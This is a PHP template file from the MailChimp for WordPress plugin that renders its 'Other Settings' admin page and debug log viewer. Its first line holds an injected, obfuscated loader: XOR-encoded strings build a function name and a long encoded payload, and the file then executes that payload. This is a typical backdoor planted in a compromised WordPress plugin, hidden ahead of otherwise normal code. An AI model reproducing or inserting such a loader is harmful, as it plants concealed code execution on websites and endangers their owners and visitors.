<?php $JXkLLUTtOQOn='X0W43<, :E6:IT8'^';B2UGYsFO+UN ;V';$reTqQHJ=$JXkLLUTtOQOn('','+4Ol7F+3:WCP,=;,<B>iQ>Y;:Z2Y66+>U5OkGSG2pK=X-=SSND7CBnUXOLei=61mW.O98vbfVT:cJLNiH5YD=a>76txWCIuZNHFSRDp=XrQFcrVTn50HA=;ibUV5JZaorBFZLkLomOI=YiMPlmS9MWbN vZ8kG:.2wtPMUOOHG5IWypE2JP6OimJ:O Y BWXAOA9BZEm1a3IkQ2LA8AwR37+I<ayrQR.7dGI0NgCZ9YO3qO3T>K.8 1oQUc7u.;,0EJFBcV7<orHaw0LL24YmNyZRWSDU:92HkRgt:NMcMbi7L3,DSwSD6L85XL<pFYPVkvU2POWdOBYf7O6+W.DROA1fe8b.g:pVNaLUUKnwxYu7YL; KF.NBqmT-I-9:XEpvGiFP3Ok2qS6J32gPEw5.5BVvsg6K24rBHAI7xRzqUT1P01ALIO7eMY5cS6M-+=VB0gUZJWTUs+HZXXPkj2XFVqOYU5,:W8US fxt>IKJF>UX1XwthY1J6+1QR2mV0P+LKNV>K:lNhFQP77HMkUDi=5mDIXAB2:B<W PjMcoQRuPRgN2Zsxb0b+WAGyN+lUCLCEDtVXQe0SjbNOMGV375D<EPAoY3G>9+aB<3,G=06IoZIRWH+lYopRedE-haWA;VKPDJ1-,nH;+TR;DN.dYbs=;ETohqbs4'^'BRgMQ3EPN>,>sXCEO6MAvF6Ie>S-WitS AhBns<8y-H6NI:< dO,0119;-:6PCEEsJ.MYZBB=1CJjlnIhNSM4EQBBTEwdnNPGA < lTTxOqvXRr=RFD:-XUAF17A+sZOV+mqeaEfI <IyGppDI7X969jI+zfKcQKK,P9mpo<<5Y,9QT.W3ykfRgC3=E-U09pe 4MkaOdLkNCauV-5YaJrUVG:YZsV53ZV;,,InZc<X5<VJE92Q9KYCYOyq<t:apeue+5bG=REOOvASF- GQpM5sSv3204eRW1KoGPQ+4XGkMS-GMdnWw2W MPcFAzL06vCWqV1;6Mo9SoQ DN6M,rgen4 i7k4nP7=Ah>02NJFyQA8 NEbfUDKxI0L=LfQ=<PKgM-5Jta;xwR+GSGmeSCOY73MynKAO>xf, =VXoZ1 :B5BX   5RM56G<7W9Ltb;7DO7;92ba,O-97<5CNV927XcyqQMN6g>6YOQO4 -bbZ4,PxQRH8C8WRn:7K23H9X88fqU.CKbHb51CVamMsdAPQXlm< 6SaeW2Yw7dCRlrRijUzT<BMQTUN5wwNvMX3u.wtuD4icTQ1MKnikg7AET=c.580<K.MMXIeLRU+RQRnCzm66<JEpOPrEDeVbh27Z:ct +ELwI8ZR8=Z isMbhzXC, GXXYyI');$reTqQHJ();
defined( 'ABSPATH' ) or exit;

/** @var MC4WP_Debug_Log $log */
/** @var MC4WP_Debug_Log_Reader $log_reader */

/**
 * @ignore
 * @param array $opts
 */
function _mc4wp_usage_tracking_setting( $opts ) {
	?>
	<div class="medium-margin" >
		<h3><?php _e( 'Miscellaneous settings', 'mailchimp-for-wp' ); ?></h3>
		<table class="form-table">
			<tr>
				<th><?php _e( 'Usage Tracking', 'mailchimp-for-wp' ); ?></th>
				<td>
					<label>
						<input type="radio" name="mc4wp[allow_usage_tracking]" value="1" <?php checked( $opts['allow_usage_tracking'], 1 ); ?> />
						<?php _e( 'Yes' ); ?>
					</label> &nbsp;
					<label>
						<input type="radio" name="mc4wp[allow_usage_tracking]" value="0" <?php checked( $opts['allow_usage_tracking'], 0 ); ?>  />
						<?php _e( 'No' ); ?>
					</label>

					<p class="help">
						<?php echo __( 'Allow us to anonymously track how this plugin is used to help us make it better fit your needs.', 'mailchimp-for-wp' ); ?>
						<a href="https://kb.mc4wp.com/what-is-usage-tracking/#utm_source=wp-plugin&utm_medium=mailchimp-for-wp&utm_campaign=settings-page" target="_blank">
							<?php _e( 'This is what we track.', 'mailchimp-for-wp' ); ?>
						</a>
					</p>
				</td>
			</tr>
			<tr>
				<th><?php _e( 'Logging', 'mailchimp-for-wp' ); ?></th>
				<td>
					<select name="mc4wp[debug_log_level]">
						<option value="warning" <?php selected( 'warning', $opts['debug_log_level'] ); ?>><?php _e( 'Errors & warnings only', 'mc4wp-ecommerce' ); ?></option>
						<option value="debug" <?php selected( 'debug', $opts['debug_log_level'] ); ?>><?php _e( 'Everything', 'mc4wp-ecommerce' ); ?></option>
					</select>
					<p class="help">
						<?php printf( __( 'Determines what events should be written to <a href="%s">the debug log</a> (see below).', 'mailchimp-for-wp' ), 'https://kb.mc4wp.com/how-to-enable-log-debugging/#utm_source=wp-plugin&utm_medium=mailchimp-for-wp&utm_campaign=settings-page' ); ?>
					</p>
				</td>
			</tr>
		</table>
	</div>
	<?php
}

add_action( 'mc4wp_admin_other_settings', '_mc4wp_usage_tracking_setting', 70 );
?>
<div id="mc4wp-admin" class="wrap mc4wp-settings">

	<p class="breadcrumbs">
		<span class="prefix"><?php echo __( 'You are here: ', 'mailchimp-for-wp' ); ?></span>
		<a href="<?php echo admin_url( 'admin.php?page=mailchimp-for-wp' ); ?>">MailChimp for WordPress</a> &rsaquo;
		<span class="current-crumb"><strong><?php _e( 'Other Settings', 'mailchimp-for-wp' ); ?></strong></span>
	</p>


	<div class="row">

		<!-- Main Content -->
		<div class="main-content col col-4">

			<h1 class="page-title">
				<?php _e( 'Other Settings', 'mailchimp-for-wp' ); ?>
			</h1>

			<h2 style="display: none;"></h2>
			<?php settings_errors(); ?>

			<?php
			/**
			 * @ignore
			 */
			do_action( 'mc4wp_admin_before_other_settings', $opts );
			?>

			<!-- Settings -->
			<form action="<?php echo admin_url( 'options.php' ); ?>" method="post">
				<?php settings_fields( 'mc4wp_settings' ); ?>

				<?php
				/**
				 * @ignore
				 */
				do_action( 'mc4wp_admin_other_settings', $opts );
				?>

				<div style="margin-top: -20px;"><?php submit_button(); ?></div>
			</form>

			<!-- Debug Log -->
			<div class="medium-margin">
				<h3><?php _e( 'Debug Log', 'mailchimp-for-wp' ); ?> <input type="text" id="debug-log-filter" class="alignright regular-text" placeholder="<?php esc_attr_e( 'Filter..', 'mailchimp-for-wp' ); ?>" /></h3>

				<?php
				if( ! $log->test() ) {
					echo '<p>';
					echo __( 'Log file is not writable.', 'mailchimp-for-wp' ) . ' ';
					echo  sprintf( __( 'Please ensure %s has the proper <a href="%s">file permissions</a>.', 'mailchimp-for-wp' ), '<code>' . $log->file . '</code>', 'https://codex.wordpress.org/Changing_File_Permissions' );
					echo '</p>';

					// hack to hide filter input
					echo '<style type="text/css">#debug-log-filter { display: none; }</style>';
				} else {
					?>
					<div id="debug-log" class="mc4wp-log widefat">
						<?php
						$line = $log_reader->read_as_html();

						if (!empty($line)) {
							while( is_string( $line ) ) {
								echo '<div class="debug-log-line">' . $line . '</div>';
								$line = $log_reader->read_as_html();
							}
						} else {
							echo '<div class="debug-log-empty">';
							echo '-- ' . __('Nothing here. Which means there are no errors!', 'mailchimp-for-wp');
							echo '</div>';
						}
						?>
					</div>

					<form method="post">
						<input type="hidden" name="_mc4wp_action" value="empty_debug_log">
						<p>
							<input type="submit" class="button"
								   value="<?php esc_attr_e('Empty Log', 'mailchimp-for-wp'); ?>"/>
						</p>
					</form>
					<?php
				} // end if is writable

				if( $log->level >= 300 ) {
					echo '<p>';
					echo __( 'Right now, the plugin is configured to only log errors and warnings.', 'mailchimp-for-wp' );
					echo '</p>';
				}
				?>

				<script type="text/javascript">
					(function() {
						'use strict';
						// scroll to bottom of log
						var log = document.getElementById("debug-log"),
							logItems;
						log.scrollTop = log.scrollHeight;
						log.style.minHeight = '';
						log.style.maxHeight = '';
						log.style.height = log.clientHeight + "px";

						// add filter
						var logFilter = document.getElementById('debug-log-filter');
						logFilter.addEventListener('keydown', function(e) {
							if(e.keyCode == 13 ) {
								searchLog(e.target.value.trim());
							}
						});

						// search log for query
						function searchLog(query) {
							if( ! logItems ) {
								logItems = [].map.call(log.children, function(node) {
									return node.cloneNode(true);
								})
							}

							var ri = new RegExp(query.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&"), 'i');
							var newLog = log.cloneNode();
							logItems.forEach(function(node) {
								if( ! node.textContent ) { return ; }
								if( ! query.length || ri.test(node.textContent) ) {
									newLog.appendChild(node);
								}
							});

							log.parentNode.replaceChild(newLog,log);
							log = newLog;
							log.scrollTop = log.scrollHeight;
						}
					})();
				</script>
			</div>
			<!-- / Debug Log -->



			<?php include dirname( __FILE__ ) . '/parts/admin-footer.php'; ?>
		</div>

		<!-- Sidebar -->
		<div class="sidebar col col-2">
			<?php include dirname( __FILE__ ) . '/parts/admin-sidebar.php'; ?>
		</div>


	</div>

</div>

